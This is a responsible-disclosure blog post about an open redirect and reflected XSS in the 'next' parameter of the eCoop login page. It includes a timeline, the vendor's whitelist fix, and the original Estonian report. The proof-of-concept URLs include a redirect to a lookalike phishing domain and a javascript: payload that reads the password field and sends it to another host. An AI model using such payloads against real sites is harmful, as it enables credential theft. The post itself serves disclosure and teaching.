---
title: eCoop open redirect and XSS on login page
date: 2020-08-04
subtitle: Accepting unvalidated user-input in redirect URL-s can result in security issues
category: Security
image: /content/2020/ecoop/header-inverse.png
---

[eCoop](https://ecoop.ee), an Estonian food retailer, had two vulnerabilities on their login page. Both were responsibly disclosed and fixed by the vendor.

When unauthenticated users visit the online e-store and try to access a feature intended for authenticated users, they are shown a login page.

![eCoop login page](/content/2020/ecoop/login-page.png)

The URL of the login page (`https://ecoop.ee/et/logisisse/?next=%2Fet%2Fostunimekirjad%2F`) has a query parameter `next`,
which is intended for user convenience - you get redirected to the subpage you were trying to access after login.

However, the frontend code in charge of using this parameter didn't validate the value, and it was possible to misuse it for two abuse cases.

The `?next=` query parameter is an urlencoded value of an URI path in the same frontend application (React router path),
with expected values like `%2Fet%2Fostunimekirjad%2F` (decoded: `/et/ostunimekirjad/`).

![React routes](/content/2020/ecoop/router.png)

The application tries to redirect to this path after the "Login" button is pressed.

# Open redirect

It was possible to feed a full URI value to the `next` parameter, hence redirecting the visitor out from the original eCoop website
after they attempted a login. The frontend code did not validate that the passed value would be a subpage of the current site.

PoC: Phishing e-mail from "Coop" with a link to `https://ecoop.ee/et/logisisse/?next=%2F%2Fekoop.ee` (`//ekoop.ee` with two slashes - external (currently unclaimed) domain).
Users would try to login on a legitimate site, but get redirected to a phishing site after the first login attempt.

![Open redirect](/content/2020/ecoop/open-redirect.png)


# Reflected XSS

It was also possible to abuse the `next` query parameter to execute JavaScript in the context of the site. This could be done, because it was possible
to specify `javascript` as the link protocol.

PoC: `https://ecoop.ee/et/logisisse/?next=javascript%3Aalert(1)` (`javascript:alert(1)`). A maliciously crafted link could be sent to a user, with the payload encoded
in the URL. The payload would execute once the victim pressed "log in", and run arbitrary JavaScript in the context of the eCoop site.

eCoop session cookie is marked as `httpOnly`, but the site has no Content Security Policy in place to protect against it. The payload could include additional scripts,
modify the content of the site, read out user-entered username/password, or phish for more information - all the while using the percieved legitimacy of the trusted domain/brand.

![XSS](/content/2020/ecoop/xss.png)


# The fix

eCoop fixed the issue 16 months after initial disclosure. The fix involved adding a frontend validator for the value of the `next` parameter, checking it against
a whitelist of all internally set React Routes.

```javascript

// ...
return o(t, e), f(t, [{
    key: "componentWillMount",
    value: function() {
        if (this.props.location.query) {
            var e = this.props.location.query.next;
            e && this.validateRedirectPath(e), this.props.location.query.e && this.setState({
                socialLoginErrors: (0, R.attachError)(null, this.props.location.query.e, this.context.activeLanguage)
            })
        }
    }
},
{              
    key: "validateRedirectPath",
    value: function(e) {
        var t = e.split("/"),
            r = this.whitelistedRedirectPaths.some(function(e) {
                var r = e.split("/");
                return r.length === t.length && r.every(function(e, r) {
                    var u = t[r];
                    return ":" === e[0] && u || e === u
                })
            });
        if (!r) throw "Invalid redirect path!"
    }
},{
    key: "_getWhitelistedRedirectPaths",
    value: function(e) {
        return e.reduce(function(e, t) {
            return e.concat(t.childRoutes.filter(function(e) {
                return e.to
            }).map(function(e) {
                return "/" + e.to
            }))
        }, [])
    }
}
// ...
```

The fix appears effective, as both PoC-s now fail.


![PoCs now fail](/content/2020/ecoop/fix1.png)


# Appendix: Timeline

- 2019-04-04 Initial discovery
- 2019-04-04 No security / IT contact (or responsible disclosure/[security.txt](https://securitytxt.org/)) found for eCoop, wrote to customer support for an IT contact
- 2019-04-05 Received contact e-mail of E-Services Development Manager
- 2019-04-07 [Responsible disclosure](https://en.wikipedia.org/wiki/Responsible_disclosure) to Coop about both problems, with full PoC \ explanation
- 2019-04-08 Acknowledgment of receipt from Coop's E-Services Development Manager; PoC forwarded to development team
- 2019-11-25 Escalation: disclosure to CERT-EE (CC Coop); as nothing had happened yet - bug still live. No response form either party
- 2020-03-12 Escalation: contact Coop ISO directly for an update (CC original report contents)
- 2020-03-12 ISO replies: acknowledgment that issue was known internally since initial report; remediation plan had been made (switch to a new technical e-store platform), but implementation delayed
- 2020-08-04 ISO notifies that the issue has been fixed in the current production system
- 2020-08-05 Verified fix (a whitelist validator had been added; protects against both PoC-s), can see no obvious bypass - issue fixed
- 2020-08-05 Public disclosure

# Appendix: developer view

solutional.ee wrote a blog on this: [Tackling Security Issues](https://solutional.ee/blog/2020-10-20-Tackling-Security-Issues.html).

# Appendix: Disclosure e-mail

Tere

Kirjutan Teile kui e-arendusjuhile heas usus, et [responsible disclosure](https://en.wikipedia.org/wiki/Responsible_disclosure) raames teada anda Coop e-poest leitud XSS + open redirect turvaveast.
Teadaolevalt ei ole neid veel halvasti ära kasutatud, ning see teavitus võimaldab Teil vead parandada, muutes Coop keskkonna klientidele (sh minule) turvalisemaks.

(Kirjutan otse Teile, kuna ei suutnud ecoop.ee kodulehelt leida turvaküsimusteks otsekontakti, ning ecoop.ee ei kasuta [security.txt](https://securitytxt.org/) standardit).

Leitud haavatavused on järgnevad.


## Open redirect

Rakenduse aktsepteerib sisselogimisel URL parameetrit "next". Näiteks, kui sisselogimata külastaja vajutab peamenüü lingile "Ostunimekirjad", suunatakse ta edasi "Sisene eCoopi" lehele, kusjuures lehe URL on `https://ecoop.ee/et/logisisse/?next=%2Fet%2Fostunimekirjad%2F`.

Aadressi vaadates märgati, et `next` parameeter sisaldab URI segmenti ja on ilmselt haavatav [open redirect](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.md) turvaveale: `next` parameetri väärtus on muudetav ning võib näidata suvalisele URL-ile - mispeale rakendus ka peale sisselogimist sinna suunab.

 

**PoC:** `https://ecoop.ee/et/logisisse/?next=%2F%2Fneti.ee` (peale sisselogimist suunatakse ümber neti.ee veebilehele)

**Probleem:** rakendus ei valideeri `next` parameetri väärtust ning suunab ka välistele domeenidele.

**Väärkasutus (näide #1):** Kliendile saadetakse link stiilis `https://ecoop.ee/et/logisisse/?next=%2F%2Fekoop.ee%2Fet%2Flogisisse`; näiteks phishing-uudiskirjaga. Kirjas olev link on õigele domeenile, ning klient usaldab seda. Peale sisselogimist suunab süsteem aga edasi phishing veebilehele, mis asub hoopis teisel domeenil, ning väidab, et sisselogimine ebaõnnestus, palun sisestada parool uuesti. Klient ei märka domeeni muutust, ning annab kolmandale osapoolele oma parooli.

**Kaitse:** `https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.md#preventing-unvalidated-redirects-and-forwards`

**Kriitilisus:** Madal


## Reflected XSS via GET URI
 

Kasutades sama `next` URL parameetrit sisselogimislehel, on võimalik ecoop keskkonnas käivitada JavaScript koodi. See on nn "Reflected XSS" haavatavus.


**Probleem:** Rakendus käivitab next parameetri väärtust kui JavaScript koodi, kasutaja browseri kontekstis - XSS

**PoC:** `https://ecoop.ee/et/logisisse/?next=javascript:window.location.href%3D%27%2F%2Flocalhost%2F%27%2Bdocument.getElementById(%27tfid-84-1%27).value` (peale sisselogimist suunatakse ümber teisele domeenile localhost, kusjuures kliendi parool on tekstina URL-is)

**Väärkasutus (näide #1):** Kliendile saadetakse phishing kirjaga link Coop e-poodi. Kirjas olev link on õigele domeenile, ning klient usaldab seda. Link viib sisselogimislehele. Kui klient vajutab "Logi sisse", käivitub `next` parameetris olev JavaScript kood, mis võtab kliendi poolt täidetud parooli väljast (enne ümbersuunnamist!) parooli väärtuse, ning saadab selle kolmandale osapoolele, kompromiteerides nõnda kliendi sisselogimisandmed.

**Kaitse:** `https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)`

**Kriitilisus:** Keskmine


Palun vastust, kinnitamaks raporti kättesaamist ning võimalusel ka indikatiivset aega, millal mainitud vead parandatakse (tüüpiliselt parandatakse turvavead maksimaalselt 90 päeva jooksul).
